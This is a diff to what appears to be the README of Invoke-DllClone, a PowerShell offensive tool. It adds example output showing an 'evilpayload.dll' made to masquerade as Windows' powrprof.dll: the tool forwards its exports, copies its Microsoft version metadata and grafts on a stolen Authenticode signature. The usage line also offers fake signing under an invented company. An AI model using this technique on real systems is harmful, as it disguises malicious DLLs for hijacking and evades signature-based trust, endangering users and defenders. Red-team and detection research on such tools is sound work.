@@ -37,3 +37,72 @@ Forward all exports of powrprof and take over the metadata fake a random signatu
 Example Usage: Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target C:\Malware\Evilpayload.dll -Output C:\Malware\powrprof.dll -FakeSign -FakeCompany lolcorp.evil
 
 ```
+
+
+```
+Example output:
+PS G:\testzone\Invoke-DLLClone> Invoke-DllClone -Source C:\Windows\System32\powrprof.dll -Target .\evilpayload.dll -Output powrprof.dll -Sign
+Source:         C:\Windows\System32\powrprof.dll
+Target:         .\evilpayload.dll
+Output:         .\2021-08-24_204139\powrprof.dll
+Signed Output:  .\2021-08-24_204139\signed_powrprof.dll
+----------------------------------------------
+[*] Clones the export table from C:\Windows\System32\powrprof.dll onto .\evilpayload.dll... using NetClone
+[+] Done.
+[*] Extracting resources from powrprof.dll
+[*] Copying resources from powrprof.dll to .\2021-08-24_204139\powrprof.dll
+[*] Extracting and adding signature ...
+
+[+] Results
+ -----------------------------------------------
+[+] Metadata
+
+
+VersionInfo : File:             G:\testzone\Invoke-DLLClone\2021-08-24_204139\signed_powrprof.dll
+              InternalName:     POWRPROF
+              OriginalFilename: POWRPROF.DLL
+              FileVersion:      10.0.19041.546 (WinBuild.160101.0800)
+              FileDescription:  Power Profile Helper DLL
+              Product:          Microsoft® Windows® Operating System
+              ProductVersion:   10.0.19041.546
+              Debug:            False
+              Patched:          False
+              PreRelease:       False
+              PrivateBuild:     False
+              SpecialBuild:     False
+              Language:         English (United States)
+
+
+
+
+[+] Digital Signature
+
+
+SignatureType     : Authenticode
+SignerCertificate : [Subject]
+                      CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
+
+                    [Issuer]
+                      CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
+
+                    [Serial Number]
+                      330000026551AE1BBD005CBFBD000000000265
+
+                    [Not Before]
+                      3/4/2020 7:30:38 PM
+
+                    [Not After]
+                      3/3/2021 7:30:38 PM
+
+                    [Thumbprint]
+                      E168609353F30FF2373157B4EB8CD519D07A2BFF
+
+Status            : HashMismatch
+
+
+
+PS G:\testzone\Invoke-DLLClone>
+
+
+
+```
